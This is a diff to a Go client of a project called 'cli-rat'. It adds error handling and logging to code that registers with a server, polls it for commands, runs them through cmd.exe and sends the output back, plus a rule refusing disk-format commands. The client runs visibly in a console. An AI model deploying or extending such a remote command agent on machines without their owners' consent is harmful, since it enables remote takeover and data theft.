@@ -7,8 +7,10 @@ import (
 	"cli-rat/pkg/httpclient"
 	"cli-rat/pkg/storage"
 	"fmt"
+	"log"
 	"os"
 	"os/exec"
+	"strings"
 	"time"
 )
 
@@ -33,7 +35,11 @@ type Client struct {
 
 // New 创建新的客户端实例
 // serverAddr: 服务端地址
+// 返回客户端实例
 func New(serverAddr string) *Client {
+	if serverAddr == "" {
+		serverAddr = defaultServerAddr
+	}
 	return &Client{
 		apiClient:  httpclient.NewClient(serverAddr),
 		serverAddr: serverAddr,
@@ -46,12 +52,24 @@ func (c *Client) Register() error {
 	// 调用服务端注册接口
 	resp, err := c.apiClient.Register(clientName)
 	if err != nil {
-		return err
+		return fmt.Errorf("注册请求失败: %v", err)
+	}
+
+	// 验证响应
+	if resp == nil {
+		return fmt.Errorf("注册响应为空")
+	}
+
+	if resp.ClientID == "" {
+		return fmt.Errorf("服务端未分配客户端ID")
 	}
 
 	// 保存分配的客户端ID
 	c.clientID = resp.ClientID
-	storage.SaveClientID(clientFile, c.clientID)
+	if err := storage.SaveClientID(clientFile, c.clientID); err != nil {
+		log.Printf("[警告] 保存客户端ID失败: %v\n", err)
+	}
+
 	fmt.Printf("[注册成功] ClientID: %s\n", c.clientID)
 	return nil
 }
@@ -84,10 +102,18 @@ func (c *Client) Unregister() {
 	if c.clientID == "" {
 		return
 	}
+
 	// 调用服务端注销接口
-	c.apiClient.Unregister(c.clientID)
+	if err := c.apiClient.Unregister(c.clientID); err != nil {
+		log.Printf("[警告] 注销请求失败: %v\n", err)
+	}
+
 	// 删除本地ID文件
-	os.Remove(clientFile)
+	if err := os.Remove(clientFile); err != nil {
+		log.Printf("[警告] 删除客户端ID文件失败: %v\n", err)
+	}
+
+	c.clientID = ""
 }
 
 // PollAndExecute 轮询并执行命令
@@ -105,6 +131,14 @@ func (c *Client) PollAndExecute() {
 		resp, err := c.apiClient.Poll(c.clientID)
 		if err != nil {
 			// 轮询失败，等待后重试
+			log.Printf("[警告] 轮询失败: %v\n", err)
+			time.Sleep(pollInterval)
+			continue
+		}
+
+		// 验证响应
+		if resp == nil {
+			log.Printf("[警告] 轮询响应为空\n")
 			time.Sleep(pollInterval)
 			continue
 		}
@@ -119,7 +153,9 @@ func (c *Client) PollAndExecute() {
 		if resp.Content == "__EXIT__" {
 			fmt.Println("[服务端请求退出]")
 			// 提交退出完成
-			c.apiClient.Submit(resp.ID, "completed", "client exited")
+			if err := c.apiClient.Submit(resp.ID, "completed", "client exited"); err != nil {
+				log.Printf("[警告] 提交退出结果失败: %v\n", err)
+			}
 			// 注销并退出程序
 			c.Unregister()
 			os.Exit(0)
@@ -138,7 +174,10 @@ func (c *Client) PollAndExecute() {
 		}
 
 		// 提交执行结果
-		c.apiClient.Submit(resp.ID, status, output)
+		if err := c.apiClient.Submit(resp.ID, status, output); err != nil {
+			log.Printf("[警告] 提交命令结果失败: %v\n", err)
+		}
+
 		fmt.Printf("[完成] 状态: %s\n", status)
 
 		// 等待下次轮询
@@ -150,8 +189,15 @@ func (c *Client) PollAndExecute() {
 // cmd: 要执行的命令字符串
 // 返回命令输出和错误信息
 func (c *Client) executeCommand(cmd string) (string, error) {
+	// 验证参数
 	if cmd == "" {
 		return "", fmt.Errorf("空命令")
+	}
+
+	// 检查命令安全性，防止危险操作
+	cmd = strings.TrimSpace(cmd)
+	if strings.HasPrefix(strings.ToLower(cmd), "format") && strings.Contains(cmd, ":") {
+		return "", fmt.Errorf("禁止执行格式化磁盘命令")
 	}
 
 	// Windows: 使用 cmd.exe /c 执行命令
@@ -180,16 +226,21 @@ func main() {
 	client.LoadClientID()
 
 	// 验证或重新注册
-	if client.clientID != "" && !client.VerifyClientID() {
-		fmt.Println("[验证] ClientID无效，重新注册...")
-		client.clientID = ""
-		os.Remove(clientFile)
+	if client.clientID != "" {
+		if !client.VerifyClientID() {
+			fmt.Println("[验证] ClientID无效，重新注册...")
+			client.clientID = ""
+			if err := os.Remove(clientFile); err != nil {
+				log.Printf("[警告] 删除旧的客户端ID文件失败: %v\n", err)
+			}
+		}
 	}
 
 	// 注册客户端
 	if err := client.Register(); err != nil {
-		fmt.Printf("[注册失败] %v\n", err)
+		log.Printf("[错误] 注册失败: %v\n", err)
 		fmt.Println("将在轮询时重试...")
+		fmt.Println("提示: 请确保服务端已启动")
 	}
 
 	// 启动轮询循环（后台运行）
@@ -197,7 +248,11 @@ func main() {
 
 	// 等待用户按回车键退出
 	fmt.Println("[监听] 按回车键退出...")
-	bufio.NewReader(os.Stdin).ReadLine()
+	reader := bufio.NewReader(os.Stdin)
+	_, err := reader.ReadString('\n')
+	if err != nil {
+		log.Printf("[警告] 读取输入失败: %v\n", err)
+	}
 
 	// 用户主动退出，注销客户端
 	client.Unregister()
